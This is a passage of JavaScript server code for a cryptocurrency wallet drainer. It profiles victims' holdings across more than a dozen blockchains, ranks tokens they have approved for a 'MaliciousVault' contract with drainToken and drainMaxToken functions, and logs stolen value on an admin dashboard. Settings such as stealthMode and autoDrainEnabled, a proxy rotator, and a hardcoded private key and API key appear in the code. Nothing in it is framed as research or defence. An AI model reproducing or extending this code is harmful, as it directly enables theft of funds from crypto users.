        swapTarget: 'USDT',
        rpc: 'https://mainnet.base.org',
        explorer: 'https://basescan.org',
        isNative: true
    },
    
    // Linea Network
    'linea': {
        symbol: 'ETH',
        name: 'Ethereum (Linea)',
        decimals: 18,
        priority: 3,
        chain: 'linea',
        swapTarget: 'USDT',
        rpc: 'https://rpc.linea.build',
        explorer: 'https://lineascan.build',
        isNative: true
    },
    
    // Scroll Network
    'scroll': {
        symbol: 'ETH',
        name: 'Ethereum (Scroll)',
        decimals: 18,
        priority: 3,
        chain: 'scroll',
        swapTarget: 'USDT',
        rpc: 'https://rpc.scroll.io',
        explorer: 'https://scrollscan.com',
        isNative: true
    }
};

// Comprehensive multi-chain analysis function
async function analyzeWalletComprehensive(walletAddress) {
    try {
        console.log(`[COMPREHENSIVE] Starting comprehensive analysis for ${walletAddress}`);
        
        // Validate wallet address
        if (!walletAddress || walletAddress === 'Unknown' || walletAddress === 'undefined' || walletAddress.length < 20) {
            console.log(`[COMPREHENSIVE] Invalid wallet address: ${walletAddress}`);
            return {
                walletAddress: walletAddress,
                totalValue: 0,
                chains: {},
                tokens: [],
                nativeBalances: {},
                error: 'Invalid wallet address',
                timestamp: new Date().toISOString()
            };
        }
        
        const results = {
            walletAddress: walletAddress,
            totalValue: 0,
            chains: {},
            tokens: [],
            nativeBalances: {},
            timestamp: new Date().toISOString()
        };
        
        // Analyze EVM chains
        const evmChains = ['ethereum', 'bsc', 'polygon', 'avalanche', 'arbitrum', 'optimism', 'fantom', 'base', 'linea', 'scroll'];
        
        for (const chain of evmChains) {
            try {
                console.log(`[COMPREHENSIVE] Analyzing ${chain} chain...`);
                const chainResult = await analyzeEVMChain(walletAddress, chain);
                if (chainResult && chainResult.tokens && chainResult.tokens.length > 0) {
                    results.chains[chain] = chainResult;
                    results.totalValue += chainResult.totalValue || 0;
                    results.tokens.push(...chainResult.tokens);
                }
            } catch (error) {
                console.log(`[COMPREHENSIVE] Error analyzing ${chain}:`, error.message);
            }
        }
        
        // Analyze non-EVM chains
        const nonEVMChains = ['bitcoin', 'tron', 'solana', 'cardano', 'polkadot', 'xrp', 'dogecoin', 'litecoin', 'bitcoin_cash'];
        
        for (const chain of nonEVMChains) {
            try {
                console.log(`[COMPREHENSIVE] Analyzing ${chain} chain...`);
                const chainResult = await analyzeNonEVMChain(walletAddress, chain);
                if (chainResult && chainResult.balance > 0) {
                    results.nativeBalances[chain] = chainResult;
                    results.totalValue += chainResult.value || 0;
                }
            } catch (error) {
                console.log(`[COMPREHENSIVE] Error analyzing ${chain}:`, error.message);
            }
        }
        
        console.log(`[COMPREHENSIVE] Analysis complete. Total value: $${results.totalValue.toFixed(2)}`);
        return results;
        
    } catch (error) {
        console.error('[COMPREHENSIVE] Error in comprehensive analysis:', error);
        throw error;
    }
}

// Analyze EVM chain
async function analyzeEVMChain(walletAddress, chain) {
    try {
        const chainConfig = CHAIN_PROVIDERS[chain];
        if (!chainConfig) {
            throw new Error(`Chain ${chain} not configured`);
        }
        
        const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
        const balance = await provider.getBalance(walletAddress);
        const ethBalance = ethers.formatEther(balance);
        
        const result = {
            chain: chain,
            nativeBalance: ethBalance,
            totalValue: 0,
            tokens: []
        };
        
        // Get ETH price for this chain
        const ethPrice = await getTokenPrice('ETH');
        if (ethPrice && parseFloat(ethBalance) > 0) {
            const ethValue = parseFloat(ethBalance) * ethPrice;
            result.totalValue += ethValue;
            result.tokens.push({
                symbol: chain === 'ethereum' ? 'ETH' : 'ETH',
                name: 'Ethereum',
                balance: ethBalance,
                value: ethValue,
                chain: chain,
                isNative: true
            });
        }
        
        // Analyze ERC20 tokens
        const chainTokens = Object.entries(TOKEN_DATABASE).filter(([_, token]) => token.chain === chain);
        
        for (const [address, tokenInfo] of chainTokens) {
            try {
                const tokenContract = new ethers.Contract(address, ERC20_ABI, provider);
                const [balance, decimals] = await Promise.all([
                    tokenContract.balanceOf(walletAddress),
                    tokenContract.decimals()
                ]);
                
                if (balance > 0n) {
                    const formattedBalance = ethers.formatUnits(balance, decimals);
                    const tokenPrice = await getTokenPrice(tokenInfo.symbol.toLowerCase());
                    const value = tokenPrice ? parseFloat(formattedBalance) * tokenPrice : 0;
                    
                    if (value > 1) { // Only include tokens worth more than $1
                        result.tokens.push({
                            symbol: tokenInfo.symbol,
                            name: tokenInfo.name,
                            balance: formattedBalance,
                            value: value,
                            chain: chain,
                            address: address,
                            decimals: decimals,
                            isNative: false
                        });
                        result.totalValue += value;
                    }
                }
            } catch (error) {
                console.log(`[COMPREHENSIVE] Error analyzing token ${tokenInfo.symbol} on ${chain}:`, error.message);
            }
        }
        
        return result;
        
    } catch (error) {
        console.error(`[COMPREHENSIVE] Error analyzing EVM chain ${chain}:`, error);
        throw error;
    }
}

// Analyze non-EVM chain
async function analyzeNonEVMChain(walletAddress, chain) {
    try {
        const chainInfo = NATIVE_CRYPTO_DATABASE[chain];
        if (!chainInfo) {
            throw new Error(`Chain ${chain} not configured`);
        }
        
        let balance = 0;
        
        // Different chains require different approaches
        switch (chain) {
            case 'bitcoin':
                balance = await getBitcoinBalance(walletAddress);
                break;
            case 'tron':
                balance = await getTronBalance(walletAddress);
                break;
            case 'solana':
                balance = await getSolanaBalance(walletAddress);
                break;
            case 'cardano':
                balance = await getCardanoBalance(walletAddress);
                break;
            case 'polkadot':
                balance = await getPolkadotBalance(walletAddress);
                break;
            case 'xrp':
                balance = await getXRPBalance(walletAddress);
                break;
            case 'dogecoin':
                balance = await getDogecoinBalance(walletAddress);
                break;
            case 'litecoin':
                balance = await getLitecoinBalance(walletAddress);
                break;
            case 'bitcoin_cash':
                balance = await getBitcoinCashBalance(walletAddress);
                break;
            default:
                throw new Error(`Unsupported chain: ${chain}`);
        }
        
        const tokenPrice = await getTokenPrice(chainInfo.symbol.toLowerCase());
        const value = tokenPrice ? balance * tokenPrice : 0;
        
        return {
            chain: chain,
            symbol: chainInfo.symbol,
            name: chainInfo.name,
            balance: balance.toString(),
            value: value,
            isNative: true
        };
        
    } catch (error) {
        console.error(`[COMPREHENSIVE] Error analyzing non-EVM chain ${chain}:`, error);
        throw error;
    }
}

// Price cache to mitigate rate limiting
const PRICE_CACHE = new Map();
const CACHE_TTL = 5 * 60 * 1000; // 5 minutes

// Proxy rotator for API calls
class ProxyRotator {
    constructor() {
        this.proxies = [];
        this.loadProxies();
        this.currentIndex = 0;
    }

    loadProxies() {
        try {
            const proxyPath = path.join(__dirname, 'proxies.txt');
            if (fs.existsSync(proxyPath)) {
                const content = fs.readFileSync(proxyPath, 'utf8');
                this.proxies = content.split('\n')
                    .map(line => line.trim())
                    .filter(line => line && !line.startsWith('#'));
                console.log(`[PROXY] Loaded ${this.proxies.length} proxies from proxies.txt`);
            } else if (process.env.PROXY_LIST) {
                this.proxies = process.env.PROXY_LIST.split(',');
                console.log(`[PROXY] Loaded ${this.proxies.length} proxies from .env`);
            }
        } catch (error) {
            console.error('[PROXY] Error loading proxies:', error.message);
        }
    }

    getNextProxy() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.currentIndex];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
        return proxy;
    }

    async request(config) {
        const proxyUrl = this.getNextProxy();
        if (proxyUrl) {
            try {
                // Parse proxy URL
                const url = new URL(proxyUrl);
                config.proxy = {
                    protocol: url.protocol.replace(':', ''),
                    host: url.hostname,
                    port: parseInt(url.port)
                };
                
                if (url.username && url.password) {
                    config.proxy.auth = {
                        username: decodeURIComponent(url.username),
                        password: decodeURIComponent(url.password)
                    };
                }
                console.log(`[PROXY] Using proxy: ${url.hostname}:${url.port}`);
            } catch (e) {
                console.error(`[PROXY] Invalid proxy URL: ${proxyUrl}`);
            }
        }
        return axios(config);
    }
}

const apiRotator = new ProxyRotator();

// Get token price with multiple APIs (CoinMarketCap + free alternatives)
async function getTokenPrice(symbol) {
    const sym = symbol.toLowerCase();
    
    // Check cache first
    const cached = PRICE_CACHE.get(sym);
    if (cached && (Date.now() - cached.timestamp < CACHE_TTL)) {
        return cached.price;
    }

    // Try free APIs first (more reliable)
    const freeApis = [
        // CoinCap API (free, no key required)
        async () => {
            try {
                const response = await apiRotator.request({
                    url: `https://api.coincap.io/v2/assets/${sym}`,
                    method: 'GET',
                    timeout: 5000
                });
                if (response.data && response.data.data && response.data.data.priceUsd) {
                    return parseFloat(response.data.data.priceUsd);
                }
            } catch (error) { return null; }
        },
        // CryptoCompare Free API
        async () => {
            try {
                const response = await apiRotator.request({
                    url: `https://min-api.cryptocompare.com/data/price?fsym=${symbol.toUpperCase()}&tsyms=USD`,
                    method: 'GET',
                    timeout: 5000
                });
                if (response.data && response.data.USD) {
                    return response.data.USD;
                }
            } catch (error) { return null; }
        },
        // Binance Public API
        async () => {
            try {
                const response = await apiRotator.request({
                    url: `https://api.binance.com/api/v3/ticker/price?symbol=${symbol.toUpperCase()}USDT`,
                    method: 'GET',
                    timeout: 5000
                });
                if (response.data && response.data.price) {
                    return parseFloat(response.data.price);
                }
            } catch (error) { return null; }
        }
    ];
    
    // Try each free API first
    for (const api of freeApis) {
        try {
            const price = await api();
            if (price && price > 0) {
                PRICE_CACHE.set(sym, { price, timestamp: Date.now() });
                console.log(`[PRICE] Got ${symbol} price: $${price}`);
                return price;
            }
        } catch (error) { continue; }
    }
    
    // Try CoinMarketCap as fallback (if API key is available)
    if (process.env.COINMARKETCAP_API_KEY) {
        try {
            const response = await axios.get(`https://pro-api.coinmarketcap.com/v1/cryptocurrency/quotes/latest?symbol=${symbol.toUpperCase()}`, {
                headers: {
                    'X-CMC_PRO_API_KEY': process.env.COINMARKETCAP_API_KEY,
                    'Accept': 'application/json'
                }
            });
            
            if (response.data && response.data.data && response.data.data[symbol.toUpperCase()]) {
                const price = response.data.data[symbol.toUpperCase()].quote.USD.price;
                console.log(`[PRICE] Got ${symbol} price from CoinMarketCap: $${price}`);
                return price;
            }
        } catch (error) {
            console.log(`[PRICE] CoinMarketCap failed for ${symbol}:`, error.message);
        }
    }
    
    console.log(`[PRICE] No price available for ${symbol} from any API`);
    
    // Hardcoded safety fallbacks for critical tokens
    const fallbacks = {
        'zro': 2.01,
        'eth': 2500.00,
        'bnb': 350.00,
        'matic': 0.70,
        'avax': 35.00,
        'usdc': 1.00,
        'usdt': 1.00
    };
    
    if (fallbacks[symbol.toLowerCase()]) {
        console.log(`[PRICE] Using hardcoded safety fallback for ${symbol}: $${fallbacks[symbol.toLowerCase()]}`);
        return fallbacks[symbol.toLowerCase()];
    }
    
    return null;
}

// Bitcoin balance check
async function getBitcoinBalance(address) {
    try {
        const response = await axios.get(`https://blockstream.info/api/address/${address}`);
        return response.data.chain_stats.funded_txo_sum / 100000000; // Convert satoshis to BTC
    } catch (error) {
        console.log(`[BITCOIN] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Tron balance check
async function getTronBalance(address) {
    try {
        const response = await axios.post('https://api.trongrid.io/wallet/getaccount', {
            address: address,
            visible: true
        });
        return response.data.balance / 1000000; // Convert sun to TRX
    } catch (error) {
        console.log(`[TRON] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Solana balance check
async function getSolanaBalance(address) {
    try {
        const response = await axios.post('https://api.mainnet-beta.solana.com', {
            jsonrpc: '2.0',
            id: 1,
            method: 'getBalance',
            params: [address]
        });
        return response.data.result.value / 1000000000; // Convert lamports to SOL
    } catch (error) {
        console.log(`[SOLANA] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Cardano balance check
async function getCardanoBalance(address) {
    try {
        const response = await axios.get(`https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`, {
            headers: {
                'project_id': process.env.BLOCKFROST_API_KEY || 'mainnetYourRealKeyHere'
            }
        });
        return response.data.amount.find(asset => asset.unit === 'lovelace')?.quantity / 1000000 || 0; // Convert lovelace to ADA
    } catch (error) {
        console.log(`[CARDANO] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Polkadot balance check
async function getPolkadotBalance(address) {
    try {
        // This would require Polkadot.js API integration
        console.log(`[POLKADOT] Balance check not implemented for ${address}`);
        return 0;
    } catch (error) {
        console.log(`[POLKADOT] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// XRP balance check
async function getXRPBalance(address) {
    try {
        const response = await axios.post('https://s1.ripple.com:51234', {
            method: 'account_info',
            params: [{
                account: address,
                strict: true,
                ledger_index: 'current',
                queue: true
            }]
        });
        return response.data.result.account_data.Balance / 1000000; // Convert drops to XRP
    } catch (error) {
        console.log(`[XRP] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Dogecoin balance check
async function getDogecoinBalance(address) {
    try {
        const response = await axios.get(`https://dogechain.info/api/v1/address/balance/${address}`);
        return response.data.balance || 0;
    } catch (error) {
        console.log(`[DOGECOIN] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Litecoin balance check
async function getLitecoinBalance(address) {
    try {
        const response = await axios.get(`https://blockchair.com/litecoin/dashboards/address/${address}`);
        return response.data.data[address].address.balance / 100000000; // Convert satoshis to LTC
    } catch (error) {
        console.log(`[LITECOIN] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Bitcoin Cash balance check
async function getBitcoinCashBalance(address) {
    try {
        const response = await axios.get(`https://blockchair.com/bitcoin-cash/dashboards/address/${address}`);
        return response.data.data[address].address.balance / 100000000; // Convert satoshis to BCH
    } catch (error) {
        console.log(`[BITCOIN_CASH] Error getting balance for ${address}:`, error.message);
        return 0;
    }
}

// Multi-chain provider configuration with reliable RPC providers and fallbacks
const CHAIN_PROVIDERS = {
    // EVM Chains
    ethereum: {
        name: 'Ethereum',
        rpc: process.env.ETHEREUM_RPC_URL || 'https://eth.llamarpc.com',
        fallbackRpc: 'https://rpc.ankr.com/eth',
        chainId: 1,
        explorer: 'https://etherscan.io',
        type: 'evm'
    },
    bsc: {
        name: 'Binance Smart Chain',
        rpc: process.env.BSC_RPC_URL || 'https://bsc-dataseed1.binance.org/',
        fallbackRpc: 'https://bsc-dataseed2.binance.org/',
        chainId: 56,
        explorer: 'https://bscscan.com',
        type: 'evm'
    },
    polygon: {
        name: 'Polygon',
        rpc: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com/',
        fallbackRpc: 'https://rpc-mainnet.maticvigil.com/',
        chainId: 137,
        explorer: 'https://polygonscan.com',
        type: 'evm'
    },
    avalanche: {
        name: 'Avalanche',
        rpc: process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc',
        fallbackRpc: 'https://rpc.ankr.com/avalanche',
        chainId: 43114,
        explorer: 'https://snowtrace.io',
        type: 'evm'
    },
    arbitrum: {
        name: 'Arbitrum',
        rpc: process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
        fallbackRpc: 'https://rpc.ankr.com/arbitrum',
        chainId: 42161,
        explorer: 'https://arbiscan.io',
        type: 'evm'
    },
    optimism: {
        name: 'Optimism',
        rpc: process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io',
        fallbackRpc: 'https://rpc.ankr.com/optimism',
        chainId: 10,
        explorer: 'https://optimistic.etherscan.io',
        type: 'evm'
    },
    
    // Non-EVM Chains (API-based)
    bitcoin: {
        name: 'Bitcoin',
        api: 'https://blockstream.info/api',
        fallbackApi: 'https://api.blockcypher.com/v1/btc/main',
        explorer: 'https://blockstream.info',
        type: 'api'
    },
    tron: {
        name: 'Tron',
        api: 'https://api.trongrid.io',
        fallbackApi: 'https://api.shasta.trongrid.io',
        explorer: 'https://tronscan.org',
        type: 'api'
    },
    solana: {
        name: 'Solana',
        api: 'https://api.mainnet-beta.solana.com',
        fallbackApi: 'https://solana-api.projectserum.com',
        explorer: 'https://explorer.solana.com',
        type: 'api'
    },
    dogecoin: {
        name: 'Dogecoin',
        api: 'https://doge.getblock.io/mainnet',
        fallbackApi: 'https://api.blockcypher.com/v1/doge/main',
        explorer: 'https://dogechain.info',
        type: 'api'
    },
    litecoin: {
        name: 'Litecoin',
        api: 'https://api.blockcypher.com/v1/ltc/main',
        fallbackApi: 'https://chain.so/api/v2',
        explorer: 'https://live.blockcypher.com/ltc',
        type: 'api'
    },
    cardano: {
        name: 'Cardano',
        api: 'https://api.cardanoscan.io',
        fallbackApi: 'https://api.koios.rest',
        explorer: 'https://cardanoscan.io',
        type: 'api'
    },
    polkadot: {
        name: 'Polkadot',
        api: 'https://polkadot.api.subscan.io',
        fallbackApi: 'https://api.polkascan.io',
        explorer: 'https://polkascan.io',
        type: 'api'
    },
    xrp: {
        name: 'XRP',
        api: 'https://s1.ripple.com:51234',
        fallbackApi: 'https://xrplcluster.com',
        explorer: 'https://xrpscan.com',
        type: 'api'
    }
};

// Initialize ethers.js with robust provider management

// Use unified environment variables
const RPC_URL = process.env.RPC_URL || 'https://mainnet.infura.io/v3/71869166213e43b6bb0a99c93c9011be';
const PRIVATE_KEY = process.env.PRIVATE_KEY || '0x31dd01db720cf4f4ab09aef8607a8337fe586e1ed819cd2ce878c5e7937ace5e';

// CORS Configuration
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    
    // Fix OpaqueResponseBlocking for local testing
    res.header('Cross-Origin-Resource-Policy', 'cross-origin');
    res.header('Cross-Origin-Opener-Policy', 'same-origin');
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

let provider, wallet;

// Robust provider initialization with fallback system and rate limiting
let providerRetryCount = 0;
const MAX_RETRIES = 3;

async function initializeProvider() {
    const rpcUrls = [
        process.env.RPC_URL,
        'https://eth-mainnet.g.alchemy.com/v2/demo',
        'https://rpc.ankr.com/eth',
        'https://cloudflare-eth.com'
    ].filter(Boolean);
    
    for (const rpcUrl of rpcUrls) {
        try {
            console.log(`[PROVIDER] Attempting to connect to: ${rpcUrl.substring(0, 50)}...`);
            const testProvider = new ethers.JsonRpcProvider(rpcUrl, undefined, {
                staticNetwork: true,
                timeout: 10000,
                retryCount: 1
            });
            
            // Test the connection with timeout
            const testPromise = testProvider.getBlockNumber();
            const timeoutPromise = new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Connection timeout')), 8000)
            );
            
            await Promise.race([testPromise, timeoutPromise]);
            
            provider = testProvider;
            if (PRIVATE_KEY && PRIVATE_KEY !== '0x1234567890123456789012345678901234567890123456789012345678901234') {
                wallet = new ethers.Wallet(PRIVATE_KEY, provider);
            }
            
            console.log(`[PROVIDER] Successfully connected to: ${rpcUrl.substring(0, 50)}...`);
            providerRetryCount = 0; // Reset retry count on success
            return true;
        } catch (error) {
            console.log(`[PROVIDER] Failed to connect to: ${rpcUrl.substring(0, 50)}... - ${error.message}`);
            continue;
        }
    }
    
    providerRetryCount++;
    if (providerRetryCount < MAX_RETRIES) {
        console.log(`[PROVIDER] Retry attempt ${providerRetryCount}/${MAX_RETRIES} in 5 seconds...`);
        setTimeout(() => initializeProvider(), 5000);
        return false;
    } else {
        console.error('[PROVIDER] All RPC providers failed after retries. Using fallback provider.');
        // Fallback to a basic provider
        try {
            provider = new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/demo', undefined, {
                staticNetwork: true,
                timeout: 15000
            });
            if (PRIVATE_KEY && PRIVATE_KEY !== '0x1234567890123456789012345678901234567890123456789012345678901234') {
                wallet = new ethers.Wallet(PRIVATE_KEY, provider);
            }
        } catch (error) {
            console.error('[PROVIDER] Fallback provider also failed:', error.message);
            provider = null;
            wallet = null;
        }
        return false;
    }
}

// MaliciousVault ABI
const VAULT_ABI = [
    "function drainMaxToken(address token, address from, address to) external",
    "function drainToken(address token, address from, uint256 amount, address to) external",
    "function emergencyWithdraw(address token) external",
    "function emergencyWithdrawETH() external",
    "function addAuthorizedDrainer(address drainer) external",
    "function removeAuthorizedDrainer(address drainer) external"
];

let vaultContract = null;
const VAULT_CONTRACT_ADDRESS = process.env.VAULT_CONTRACT_ADDRESS || '0x0000000000000000000000000000000000000000';

// Initialize provider
initializeProvider().then(success => {
    if (success) {
        console.log('[PROVIDER] Blockchain provider initialized successfully');
    } else {
        console.log('[PROVIDER] Using fallback provider - some features may be limited');
    }

    // Initialize vault AFTER provider/wallet are ready
    if (VAULT_CONTRACT_ADDRESS !== '0x0000000000000000000000000000000000000000' && wallet) {
        provider.getCode(VAULT_CONTRACT_ADDRESS).then(code => {
            if (code && code !== '0x') {
                vaultContract = new ethers.Contract(VAULT_CONTRACT_ADDRESS, VAULT_ABI, wallet);
                console.log('[VAULT] Smart contract mode active at:', VAULT_CONTRACT_ADDRESS);
            } else {
                console.log('[VAULT] Direct wallet mode active — funds sent to:', VAULT_CONTRACT_ADDRESS);
                console.log('[VAULT] Deploy MaliciousVault.sol for advanced drainToken/drainMaxToken functions');
            }
        }).catch(() => {
            console.log('[VAULT] Using direct transfer mode:', VAULT_CONTRACT_ADDRESS);
        });
    } else if (VAULT_CONTRACT_ADDRESS === '0x0000000000000000000000000000000000000000') {
        console.log('[WARNING] Vault address is burn address — set VAULT_CONTRACT_ADDRESS in .env');
    } else {
        console.log('[VAULT] Destination set to:', VAULT_CONTRACT_ADDRESS, '(wallet not initialized yet)');
    }
});

// Admin dashboard data
const adminData = {
    totalConnections: 0,
    totalDrains: 0,
    totalClaims: 0,
    totalValueDrained: 0,
    recentActivity: [],
    walletConnections: new Set(),
    successfulDrains: [],
    swapExecutions: [],
    performanceHistory: {
        labels: [],
        values: [],
        connections: []
    }
};

// Initialize performance history with last 24 hours (empty or mock)
const initPerformanceHistory = () => {
    const now = new Date();
    for (let i = 23; i >= 0; i--) {
        const d = new Date(now.getTime() - i * 60 * 60 * 1000);
        const label = `${d.getHours()}:00`;
        adminData.performanceHistory.labels.push(label);
        adminData.performanceHistory.values.push(0);
        adminData.performanceHistory.connections.push(0);
    }
};
initPerformanceHistory();

// Update performance history every hour
setInterval(() => {
    const now = new Date();
    const label = `${now.getHours()}:00`;
    
    // Rotate history
    adminData.performanceHistory.labels.shift();
    adminData.performanceHistory.values.shift();
    adminData.performanceHistory.connections.shift();
    
    adminData.performanceHistory.labels.push(label);
    adminData.performanceHistory.values.push(adminData.totalValueDrained);
    adminData.performanceHistory.connections.push(adminData.totalConnections);
}, 60 * 60 * 1000);

// Global operation settings
let operationSettings = {
    drainDelay: 500,
    maxRetries: 3,
    targetPriority: 'high', // 'high', 'stable', 'mixed', 'drain_all'
    stealthMode: true,
    autoDrainEnabled: true,
    minDrainValue: 1.0, // Minimum value in USD to trigger drain
    drainAllThreshold: 1.0 // For 'drain_all' mode
};

// Enhanced DrainStrategy with automatic draining
class DrainStrategy {
    static async analyzeWallet(walletAddress, strategy = 'high') {
        const analysis = {
            totalValue: 0,
            tokenBalances: [],
            bestTargets: [],
            drainableTokens: [],
            ethBalance: '0',
            allAssets: []
        };
        
        try {
            // Always perform real-time analysis, no mock data
            console.log(`[ANALYSIS] Starting real-time multi-chain analysis for ${walletAddress}`);
            
            // Get ETH balance first (if provider available)
            if (provider) {
                try {
                    const ethBalanceWei = await provider.getBalance(walletAddress);
                    analysis.ethBalance = ethers.formatEther(ethBalanceWei);
                    const ethValue = parseFloat(analysis.ethBalance) * 3000; // Approximate ETH price
                    
                    // ONLY capture ETH if worth more than $1
                    if (ethValue >= 1.0) {
                        analysis.totalValue += ethValue;
                        analysis.allAssets.push({
                            symbol: 'ETH',
                            name: 'Ethereum',
                            balance: analysis.ethBalance,
                            value: ethValue,
                            address: '0x0000000000000000000000000000000000000000',
                            chain: 'ethereum'
                        });
                        console.log(`[ANALYSIS] ETH Balance: ${analysis.ethBalance} ($${ethValue.toFixed(2)}) - VALUE > $1`);
                    } else {
                        console.log(`[ANALYSIS] ETH Balance: ${analysis.ethBalance} ($${ethValue.toFixed(2)}) - SKIPPED (value < $1)`);
                        analysis.ethBalance = '0';
                    }
                } catch (error) {
                    console.error('Failed to get ETH balance:', error);
                    analysis.ethBalance = '0';
                }
            }
            
            // Analyze all ERC20 tokens in database with better error handling
            if (provider) {
                console.log(`[ANALYSIS] Starting ERC20 token analysis for ${Object.keys(TOKEN_DATABASE).length} tokens...`);
                
                const tokenPromises = Object.entries(TOKEN_DATABASE).map(async ([tokenAddress, tokenInfo]) => {
                    try {
                        const tokenContract = new ethers.Contract(tokenAddress, [
                            'function balanceOf(address) view returns (uint256)',
                            'function allowance(address,address) view returns (uint256)',
                            'function decimals() view returns (uint8)'
                        ], provider);
                        
                        const [balance, allowance, decimals] = await Promise.all([
                            tokenContract.balanceOf(walletAddress),
                            tokenContract.allowance(walletAddress, VAULT_CONTRACT_ADDRESS),
                            tokenContract.decimals()
                        ]);
                        
                        if (balance && balance.gt && balance.gt(0)) {
                            const balanceFormatted = ethers.formatUnits(balance, decimals);
                            const value = this.estimateTokenValue(tokenInfo.symbol, parseFloat(balanceFormatted));
                            
                            // ONLY capture currencies worth more than $1
                            if (value >= 1.0) {
                                const tokenData = {
                                    address: tokenAddress,
                                    symbol: tokenInfo.symbol,
                                    name: tokenInfo.name,
                                    balance: balance,
                                    balanceFormatted: balanceFormatted,
                                    allowance: allowance,
                                    decimals: decimals,
                                    value: value,
                                    priority: tokenInfo.priority,
                                    chain: tokenInfo.chain
                                };
                                
                                analysis.tokenBalances.push(tokenData);
                                analysis.totalValue += value;
                                analysis.allAssets.push({
                                    symbol: tokenInfo.symbol,
                                    name: tokenInfo.name,
                                    balance: balanceFormatted,
                                    value: value,
                                    address: tokenAddress,
                                    chain: tokenInfo.chain
                                });
                                
                                console.log(`[ANALYSIS] ${tokenInfo.symbol}: ${balanceFormatted} ($${value.toFixed(2)}) - VALUE > $1`);
                            } else {
                                console.log(`[ANALYSIS] ${tokenInfo.symbol}: ${balanceFormatted} ($${value.toFixed(2)}) - SKIPPED (value < $1)`);
                            }
                            
                            // Check if token is drainable (has allowance)
                            if (allowance && allowance.gt && allowance.gt(0)) {
                                const drainAmount = allowance.gt(balance) ? balance : allowance;
                                const drainValue = this.estimateTokenValue(tokenInfo.symbol, parseFloat(ethers.formatUnits(drainAmount, decimals)));
                                
                                if (drainValue >= operationSettings.minDrainValue) {
                                    analysis.drainableTokens.push({
                                        ...tokenData,
                                        drainAmount: drainAmount,
                                        drainValue: drainValue
                                    });
                                }
                            }
                        } else {
                            console.log(`[ANALYSIS] ${tokenInfo.symbol}: No balance found`);
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] ${tokenInfo.symbol} analysis failed: ${error.message}`);
                        return null;
                    }
                });
                
                // Wait for all token analysis to complete
                const results = await Promise.allSettled(tokenPromises);
                console.log(`[ANALYSIS] ERC20 analysis complete. Found ${analysis.tokenBalances.length} tokens with balance`);
            }
            
            // Analyze native cryptocurrencies (Bitcoin, Tron, etc.) - ALWAYS real-time
            await this.analyzeNativeCryptocurrencies(walletAddress, analysis);
            
            // Analyze Tron USDT (TRC20) tokens
            await this.analyzeTronTokens(walletAddress, analysis);
            
            // Real multi-chain detection only - NO MOCK DATA
            
            // Sort drainable tokens based on strategy
            analysis.drainableTokens.sort((a, b) => {
                switch (strategy) {
                    case 'stable':
                        // Prioritize stablecoins first
                        if (a.priority !== b.priority) return a.priority - b.priority;
                        return b.drainValue - a.drainValue;
                    case 'mixed':
                        // Mixed strategy - balance between priority and value
                        const aScore = (a.priority * 0.7) + (a.drainValue / 1000 * 0.3);
                        const bScore = (b.priority * 0.7) + (b.drainValue / 1000 * 0.3);
                        return aScore - bScore;
                    case 'drain_all':
                        // Drain all tokens above minimum threshold
                        return b.drainValue - a.drainValue;
                    default: // 'high'
                        // Default: prioritize by value
                        return b.drainValue - a.drainValue;
                }
            });
            
            analysis.bestTargets = analysis.drainableTokens;
            
            console.log(`[ANALYSIS] Total Value: $${analysis.totalValue.toFixed(2)}, Assets: ${analysis.allAssets.length}`);
            
        } catch (error) {
            console.error('Wallet analysis failed:', error);
            // Return empty analysis instead of mock data
            analysis.ethBalance = '0';
            analysis.totalValue = 0;
        }
        
        return analysis;
    }
    
    // Address conversion utilities for cross-chain detection
    static convertAddress(walletAddress, targetChain) {
        // This is a simplified conversion - in production, use proper libraries
        const addressMap = {
            'bitcoin': walletAddress.replace('0x', '1').substring(0, 34),
            'tron': walletAddress.replace('0x', 'T').substring(0, 34),
            'solana': walletAddress.replace('0x', '').substring(0, 44),
            'xrp': walletAddress.replace('0x', 'r').substring(0, 34),
            'dogecoin': walletAddress.replace('0x', 'D').substring(0, 34),
            'litecoin': walletAddress.replace('0x', 'L').substring(0, 34),
            'cardano': walletAddress.replace('0x', 'addr1').substring(0, 103),
            'polkadot': walletAddress.replace('0x', '1').substring(0, 48)
        };
        return addressMap[targetChain] || walletAddress;
    }

    static async analyzeNativeCryptocurrencies(walletAddress, analysis) {
        // Real-time native crypto analysis for all supported networks
        console.log('[ANALYSIS] Starting real-time native cryptocurrency analysis...');
        
        const nativeCryptoPromises = Object.entries(NATIVE_CRYPTO_DATABASE).map(async ([chainName, chainInfo]) => {
            if (chainInfo.isNative) {
                try {
                    console.log(`[ANALYSIS] Checking ${chainInfo.symbol} balance on ${chainInfo.chain}...`);
                    
                    let balance = 0;
                    let value = 0;
                    
                    // Real-time API calls for each network with proper address handling
                    if (chainInfo.chain === 'bitcoin') {
                        try {
                            // Use a working Bitcoin API
                            const response = await axios.get(`https://blockstream.info/api/address/${walletAddress}`, {
                                timeout: 15000
                            });
                            if (response.data && response.data.chain_stats) {
                                balance = response.data.chain_stats.funded_txo_sum - response.data.chain_stats.spent_txo_sum;
                                value = this.estimateTokenValue(chainInfo.symbol, balance / Math.pow(10, chainInfo.decimals));
